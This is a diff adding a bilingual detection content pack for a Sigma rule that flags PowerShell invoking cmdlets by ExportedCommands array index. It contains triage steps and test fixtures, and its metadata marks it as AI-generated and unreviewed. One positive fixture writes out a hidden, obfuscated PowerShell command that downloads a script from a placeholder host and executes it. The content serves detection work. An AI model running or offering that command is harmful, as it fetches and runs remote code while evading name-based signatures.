@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "0c3ebe9f-df09-4e00-be0f-73d4ca8d62f6",
+    "title": "PowerShell Dynamic Module Invocation Via ExportedCommands Array Index",
+    "level": "high",
+    "status": "experimental",
+    "author": "Norbert Jaśniewicz (AlphaSOC), Swachchhanda Shrawan Poudel (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_cmdlet_invocation_via_exported_commands_array_index.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_cmdlet_invocation_via_exported_commands_array_index.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027.010",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó PowerShell con una línea de comandos que enumera los comandos exportados de Microsoft.PowerShell.Utility y los invoca por índice de arreglo, sin escribir su nombre. Es una técnica de ofuscación para ocultar cmdlets como Invoke-RestMethod o Invoke-Expression.",
+      "what_it_detects": "Procesos powershell.exe o pwsh.exe cuyo CommandLine contiene Get-Module o gmo, ListAvailable, Microsoft.PowerShell.Utility, ExportedCommands y Values, más un acceso por índice entre corchetes (por ejemplo $c[12]).",
+      "why_it_matters": "Resolver un cmdlet por su posición en la lista evita las firmas basadas en nombres y suele servir para descargar y ejecutar un payload. Corresponde a ofuscación de comandos (T1027.010) y ejecución con PowerShell (T1059.001), habitual en señuelos tipo ClickFix.",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique los índices usados, las URL, las rutas de salida (-OutFile) y los parámetros como -NoP, -W Hidden o -C.",
+        "Resuelva qué cmdlet corresponde a cada índice ejecutando la misma enumeración en un laboratorio con la misma versión de PowerShell; no ejecute el comando original.",
+        "Revise el ParentImage: explorer.exe sugiere un pegado en el cuadro Ejecutar (ClickFix); revise la clave RunMRU del usuario. Navegadores u Office también son sospechosos.",
+        "Busque procesos hijos, conexiones de red y archivos creados en el mismo host dentro de +/- 15 minutos, en especial descargas en Temp o AppData.",
+        "Si hay URL o dominios, consulte su reputación y búsquelos en logs de proxy y DNS para identificar otros hosts afectados.",
+        "Compruebe el usuario: si es una cuenta estándar sin funciones de administración o desarrollo, la sospecha aumenta.",
+        "Revise alertas previas del mismo host y usuario, y los logs de Script Block (4104) para ver el contenido desofuscado."
+      ],
+      "false_positives": [
+        "Uso legítimo de indexación de ExportedCommands en scripts de administración o pruebas internas; debería ser poco frecuente.",
+        "Ejercicios de red team o pruebas con Atomic Red Team autorizadas y documentadas."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el usuario y el contexto (cambio aprobado, prueba autorizada) antes de actuar.",
+        "Si es malicioso, aísle el endpoint y bloquee las URL, dominios o IP observados en proxy y firewall.",
+        "Recolecte los archivos descargados, calcule su hash y analícelos; elimine el payload y la persistencia solo después de documentarlos.",
+        "Restablezca las credenciales del usuario si hubo ejecución de payload, y busque el mismo patrón en el resto de la flota."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque esta forma de invocar cmdlets casi no tiene uso legítimo y suele indicar una evasión deliberada que precede a la descarga y ejecución de código."
+    },
+    "en": {
+      "summary": "PowerShell ran a command line that enumerates the exported commands of Microsoft.PowerShell.Utility and invokes them by array index instead of by name. This obfuscation hides cmdlets such as Invoke-RestMethod or Invoke-Expression.",
+      "what_it_detects": "powershell.exe or pwsh.exe processes whose CommandLine contains Get-Module or gmo, ListAvailable, Microsoft.PowerShell.Utility, ExportedCommands and Values, plus a bracketed index access such as $c[12].",
+      "why_it_matters": "Resolving a cmdlet by its position in a list defeats name-based signatures and is typically used to download and run a payload. This maps to command obfuscation (T1027.010) and PowerShell execution (T1059.001), common in ClickFix-style lures.",
+      "triage_steps": [
+        "Read the full CommandLine: note the indexes used, URLs, output paths (-OutFile) and flags like -NoP, -W Hidden or -C.",
+        "Resolve which cmdlet each index maps to by running the same enumeration in a lab with the same PowerShell version; never rerun the original command.",
+        "Check ParentImage: explorer.exe suggests a Run-dialog paste (ClickFix), so review the user's RunMRU key. Browser or Office parents are also suspicious.",
+        "Pivot on the same host within +/- 15 minutes for child processes, network connections and new files, especially in Temp or AppData.",
+        "Look up any URLs or domains for reputation and search proxy and DNS logs for other hosts contacting them.",
+        "Check the user: a standard account with no admin or developer role raises suspicion.",
+        "Review earlier alerts for the same host and user, and Script Block logs (4104) for the deobfuscated content."
+      ],
+      "false_positives": [
+        "Legitimate ExportedCommands indexing in admin scripts or internal testing; should be rare.",
+        "Authorized, documented red team exercises or Atomic Red Team tests."
+      ],
+      "response_steps": [
+        "Confirm with the user and change records whether the activity was approved before acting.",
+        "If malicious, isolate the endpoint and block observed URLs, domains or IPs at the proxy and firewall.",
+        "Collect downloaded files, hash and analyze them; remove the payload and any persistence only after documenting them.",
+        "Reset the user's credentials if a payload executed, and hunt for the same pattern across the fleet."
+      ],
+      "severity_rationale": "High fits because invoking cmdlets this way has almost no legitimate use and usually signals deliberate evasion ahead of code download and execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden powershell.exe launched from explorer.exe (Run dialog) resolving cmdlets by index to download and execute a script",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -NoP -W Hidden -C \"$kp=12;$sz=32;$c=((Get-Module -ListAvailable 'Microsoft.PowerShell.Utility')).ExportedCommands.Values;$c=$c.Name;& $c[$kp] 'https://cdn.example.com/update.ps1' -OutFile C:\\Users\\jperez\\AppData\\Local\\Temp\\u.ps1;$q=$c[$sz];& $q (Get-Content C:\\Users\\jperez\\AppData\\Local\\Temp\\u.ps1 -Raw)\""
+        }
+      },
+      {
+        "description": "pwsh.exe using the gmo alias and a literal index",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0177.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "pwsh.exe -NoProfile -Command \"$m=(gmo -ListAvailable Microsoft.PowerShell.Utility).ExportedCommands.Values;$n=$m.Name;& $n[32] 'Write-Output test'\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Administrator listing Utility module exports without the Values property or any index access",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-ADM-01.andes.example.com",
+          "User": "ANDES\\admin.rgomez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command \"Get-Module -ListAvailable Microsoft.PowerShell.Utility | Select-Object -ExpandProperty ExportedCommands\""
+        }
+      },
+      {
+        "description": "Counting exported commands via Values with no bracketed index",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
+          "CommandLine": "pwsh.exe -NoProfile -Command \"(Get-Module -ListAvailable Microsoft.PowerShell.Utility).ExportedCommands.Values | Measure-Object\""
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
